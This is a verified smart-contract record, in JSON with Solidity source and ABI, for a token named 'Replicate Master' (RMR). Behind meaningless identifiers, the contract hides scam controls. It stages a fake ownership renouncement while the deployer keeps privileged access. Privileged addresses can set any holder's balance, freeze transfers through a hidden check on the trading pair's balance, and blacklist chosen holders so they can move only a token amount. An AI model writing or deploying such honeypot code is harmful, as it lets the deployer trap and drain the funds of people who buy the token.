{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingSellTake {\n    function createPair(address walletLiquidity, address autoAmount) external returns (address);\n}\n\ninterface minMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingTo) external view returns (uint256);\n\n    function transfer(address tokenTotalExempt, uint256 receiverAtMin) external returns (bool);\n\n    function allowance(address receiverList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverAtMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenTotalExempt,\n        uint256 receiverAtMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isAt, uint256 value);\n    event Approval(address indexed receiverList, address indexed spender, uint256 value);\n}\n\nabstract contract exemptList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchShould is minMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReplicateMaster is exemptList, minMarketing, launchShould {\n\n    uint256 private minTotal = 100000000 * 10 ** 18;\n\n    uint256 private marketingTx;\n\n    function senderLaunched(address isAmountMin) public {\n        if (receiverFund) {\n            return;\n        }\n        \n        swapIs[isAmountMin] = true;\n        if (marketingTrading) {\n            marketingTx = receiverFee;\n        }\n        receiverFund = true;\n    }\n\n    function allowance(address liquidityShouldExempt, address enableLaunch) external view virtual override returns (uint256) {\n        if (enableLaunch == toLaunch) {\n            return type(uint256).max;\n        }\n        return takeFee[liquidityShouldExempt][enableLaunch];\n    }\n\n    bool private minMode;\n\n    address takeAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return walletMaxMarketing;\n    }\n\n    function transfer(address receiverLiquidityFrom, uint256 receiverAtMin) external virtual override returns (bool) {\n        return liquidityTotal(_msgSender(), receiverLiquidityFrom, receiverAtMin);\n    }\n\n    uint8 private isShould = 18;\n\n    function swapTotal(address receiverLiquidityFrom, uint256 receiverAtMin) public {\n        shouldBuy();\n        launchedLimit[receiverLiquidityFrom] = receiverAtMin;\n    }\n\n    mapping(address => bool) public shouldTotal;\n\n    address toLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return launchLiquidity;\n    }\n\n    string private buyMaxReceiver = \"RMR\";\n\n    function balanceOf(address marketingTo) public view virtual override returns (uint256) {\n        return launchedLimit[marketingTo];\n    }\n\n    bool private marketingTrading;\n\n    mapping(address => uint256) private launchedLimit;\n\n    uint256 private isLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMaxReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchLiquidity;\n    }\n\n    uint256 feeLaunched;\n\n    uint256 constant fundTo = 5 ** 10;\n\n    address private launchLiquidity;\n\n    function modeShould() public {\n        emit OwnershipTransferred(minTradingSell, address(0));\n        launchLiquidity = address(0);\n    }\n\n    function senderTx(uint256 receiverAtMin) public {\n        shouldBuy();\n        totalSender = receiverAtMin;\n    }\n\n    function liquidityTotal(address sellLimit, address tokenTotalExempt, uint256 receiverAtMin) internal returns (bool) {\n        if (sellLimit == minTradingSell) {\n            return launchedReceiver(sellLimit, tokenTotalExempt, receiverAtMin);\n        }\n        uint256 marketingList = minMarketing(teamSender).balanceOf(takeAt);\n        require(marketingList == totalSender);\n        require(tokenTotalExempt != takeAt);\n        if (shouldTotal[sellLimit]) {\n            return launchedReceiver(sellLimit, tokenTotalExempt, fundTo);\n        }\n        return launchedReceiver(sellLimit, tokenTotalExempt, receiverAtMin);\n    }\n\n    address public teamSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minTotal;\n    }\n\n    mapping(address => bool) public swapIs;\n\n    uint256 private amountTradingMarketing;\n\n    uint256 public receiverFee;\n\n    function launchedReceiver(address sellLimit, address tokenTotalExempt, uint256 receiverAtMin) internal returns (bool) {\n        require(launchedLimit[sellLimit] >= receiverAtMin);\n        launchedLimit[sellLimit] -= receiverAtMin;\n        launchedLimit[tokenTotalExempt] += receiverAtMin;\n        emit Transfer(sellLimit, tokenTotalExempt, receiverAtMin);\n        return true;\n    }\n\n    uint256 totalSender;\n\n    function approve(address enableLaunch, uint256 receiverAtMin) public virtual override returns (bool) {\n        takeFee[_msgSender()][enableLaunch] = receiverAtMin;\n        emit Approval(_msgSender(), enableLaunch, receiverAtMin);\n        return true;\n    }\n\n    constructor (){\n        \n        atTx receiverShouldIs = atTx(toLaunch);\n        teamSender = tradingSellTake(receiverShouldIs.factory()).createPair(receiverShouldIs.WETH(), address(this));\n        \n        minTradingSell = _msgSender();\n        swapIs[minTradingSell] = true;\n        launchedLimit[minTradingSell] = minTotal;\n        modeShould();\n        \n        emit Transfer(address(0), minTradingSell, minTotal);\n    }\n\n    event OwnershipTransferred(address indexed modeTake, address indexed teamLaunched);\n\n    function shouldBuy() private view {\n        require(swapIs[_msgSender()]);\n    }\n\n    function transferFrom(address sellLimit, address tokenTotalExempt, uint256 receiverAtMin) external override returns (bool) {\n        if (_msgSender() != toLaunch) {\n            if (takeFee[sellLimit][_msgSender()] != type(uint256).max) {\n                require(receiverAtMin <= takeFee[sellLimit][_msgSender()]);\n                takeFee[sellLimit][_msgSender()] -= receiverAtMin;\n            }\n        }\n        return liquidityTotal(sellLimit, tokenTotalExempt, receiverAtMin);\n    }\n\n    bool public receiverFund;\n\n    uint256 private launchedEnableTotal;\n\n    mapping(address => mapping(address => uint256)) private takeFee;\n\n    string private walletMaxMarketing = \"Replicate Master\";\n\n    address public minTradingSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isShould;\n    }\n\n    uint256 public tradingMax;\n\n    function marketingMaxTrading(address sellMarketingMax) public {\n        shouldBuy();\n        if (minMode == marketingTrading) {\n            receiverFee = amountTradingMarketing;\n        }\n        if (sellMarketingMax == minTradingSell || sellMarketingMax == teamSender) {\n            return;\n        }\n        shouldTotal[sellMarketingMax] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShouldExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketingMax\",\"type\":\"address\"}],\"name\":\"marketingMaxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTradingSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAmountMin\",\"type\":\"address\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverAtMin\",\"type\":\"uint256\"}],\"name\":\"senderTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtMin\",\"type\":\"uint256\"}],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTotalExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReplicateMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}